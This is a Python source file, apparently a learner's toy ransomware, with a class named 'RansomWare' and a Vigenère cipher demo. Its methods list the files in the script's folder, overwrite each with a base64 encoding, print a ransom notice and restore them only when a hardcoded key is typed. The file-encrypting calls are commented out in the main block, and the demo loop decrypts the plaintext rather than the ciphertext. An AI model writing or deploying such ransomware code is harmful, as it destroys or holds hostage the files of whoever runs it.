import os
import sys
import base64
import logging
import pyperclip

LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

class RansomWare:
    def __init__(self, name):
        self._name=name
    
    @property
    def name(self):
        return self._name
    
    @property
    def secret_key(self):
        return "MBAPPE_SE_QUEDA_TOP_S3CR3T" 

    @name.setter
    def name(self, n_name):
        self._name= n_name

    def enter_key(self):
        return input("You must enter the key: ")
    
    def about_ransom(self):
        print(
            "Your file was encrypted,\n"
            "therefore you must enter\n"
            "the key to be able to use it\n"
            
        )

    def encrypt_a_file(self, filename):
        with open(filename,'r') as file:
            text = file.read()
        encrypted_file = base64.b64encode(text.encode('utf-8'))
        with open(filename,'w') as file:
            file.write(encrypted_file.decode('utf-8'))
        
    def decrypt_a_file(self, key, filename):
        with open(filename,'r') as file:
            text = file.read()
        decrypted_file = base64.b64decode(text)
        with open(filename,'w') as file:
            file.write(decrypted_file.decode('utf-8'))

    def get_files(self, path):
        files = []
        for file in os.listdir(path):
            if file == sys.argv[0]:
                continue
            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)
        return files

    def encrypt_files(self, path):
        cont_files_dead=0
        files = self.get_files(path)
        
        for file in files:
            logging.debug('Encrypting this file:{}'.format(file))
            self.encrypt_a_file(file)
            cont_files_dead+=1
        self.about_ransom()
        return cont_files_dead

    def decrypt_files(self, path):
        key = self.enter_key()

        if key != self.secret_key:
            print("!!!!!!!!!WRONG KEY!!!!!!!!ヽ(ಠ_ಠ)ノ")
            return
        files = self.get_files(path)

        for file in files:
            self.decrypt_a_file(key, file)
        print("You saved your files, it's a miracle")




    #Nuevo algoritmo de encriptamiento 
    def encryptMessage(self, key, message):
        return self.translateMessage(key, message, 'encrypt')
    def decryptMessage(self, key, message):
        return self.translateMessage(key, message, 'decrypt')
    
    def translateMessage(self, key, message, mode):
        translated = [] # stores the encrypted/decrypted message string
        keyIndex = 0
        key = key.upper()
    
        for symbol in message:
            num = LETTERS.find(symbol.upper())
            if num != -1:
                if mode == 'encrypt':
                    num += LETTERS.find(key[keyIndex])
                elif mode == 'decrypt':
                    num -= LETTERS.find(key[keyIndex])
                num %= len(LETTERS)
                
                if symbol.isupper():
                    translated.append(LETTERS[num])
                elif symbol.islower():
                    translated.append(LETTERS[num].lower())
                keyIndex += 1
                
                if keyIndex == len(key):
                    keyIndex = 0
            else:
                translated.append(symbol)
        return ''.join(translated)

    


if __name__ == '__main__':

    ransom = RansomWare('PruebaRansomWare')
    myMessage = "This is basic implementation of Vignere Cipher"
    Key="holasoygerman"
    
    cripto = ransom.encryptMessage(Key, myMessage)
    print(cripto)
    
    while True:
        key2 = ransom.enter_key()
        decripto = ransom.decryptMessage(key2, myMessage)
        print(decripto)
        if decripto==myMessage:
            break

    #ransom = RansomWare('PruebaRansomWare')
    #logging.basicConfig(level=logging.DEBUG)
    #path = os.path.dirname(os.path.abspath(__file__))
    #number_of_files = ransom.encrypt_files(path)
    #print("Number of encrypted files: {}".format(number_of_files))

    #ransom.decrypt_files(path)
